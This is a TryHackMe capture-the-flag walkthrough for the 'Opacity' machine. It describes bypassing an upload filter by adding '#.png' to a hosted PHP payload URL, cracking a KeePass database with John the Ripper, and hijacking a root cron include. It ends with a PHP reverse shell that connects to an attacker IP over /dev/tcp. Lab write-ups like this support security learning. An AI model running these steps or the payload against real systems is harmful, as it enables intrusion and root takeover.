# **Opacity** | Tryhackme


![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/25a7f534-437c-4954-b925-0553935ee68b)


***

Running our nmap scan for port discovery and service detection we have-:




| Ports | Service     | Versions            |
| ----- | ----------- | ------------------- |
| 22    | SSH         | OpenSSH 8.2p1       |
| 80    | HTTP        | Apache httpd 2.4.41 |
| 139   | netbios-ssn | Samba smbd 4.6.2    |
| 445   | netbios-ssn | Samba smbd 4.6.2    |


Navigating to port 80/HTTP we have a login page, trying out several default credentials doesn't seem to work, we don't have anything juicy in page-source also :( -:


![](https://i.imgur.com/jS53K7G.png)



However performing directory bruteforcing with `dirsearch` we found few directories in which `/cloud` stands out 😁



![](https://i.imgur.com/B5XCiIh.png)



Navigating to `/cloud` we have a page with an upload function however we can't upload files locally, so we have to directly download the files by hosting it on a specific web server and pasting the URL into the blank bar given




![](https://i.imgur.com/9HdwatE.png)


I noticed you can't download files other than `.png` even if they do not exist, the file extension must literally end with a `.png` extension.



![](https://i.imgur.com/Iif2P3x.png)


We can bypass this file upload function by putting a `#` sign after our major payload file extension just as shown in the below URL. Note that you have to host your reverse shell in `PHP` format and have your listener already started up.


[http://10.11.69.221/wtf.php#.png](http://10.11.69.221/wtf.php#.png)



![](https://i.imgur.com/su4Vsmm.png)


Then we have our shell back as user `www-data`, note that this vulnerability is known as an **Remote File Upload**{RFU} vulnerability, Navigating to the `/opt` directory we have a `dataset.kdbx` file.




![](https://i.imgur.com/TZ6W2uQ.png)



We can go ahead and decrypt this file using jtR


```bash
keepass2john dataset.kdbx > hash.txt
john hash.txt --wordlist=<PATH TO WORDLIST>
```



![](https://i.imgur.com/aWIl0Nq.png)

Opening the encrypted file with the **keepass2** password manager with the new password gotten, we have another user's called `sysadmin` password


![](https://i.imgur.com/EtETWH0.png)

We can use this to login via SSH, Enumerating cron jobs with `pspy32s` we can see that the root user is running the `/home/sysadmin/scripts/script.php` script every minute


![](https://i.imgur.com/RRiOleS.png)

However reading this script we can see that a `backup.iinc.php` file is been called to backup everything in the `scripts` folder to `/var/backups/backup.zip` 


![](https://i.imgur.com/d9QMsHV.png)


Since this is this user's home folder we can move this file to the `/tmp` directory and create another file with that same name and paste our payload in there, Probably your reverse shell :(

![](https://i.imgur.com/DqP048F.png)

Then we have our reverse shell as user `root`


```PHP
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.11.69.221/1337 0>&1'");
?>
```


![](https://i.imgur.com/7hcHGRz.png)




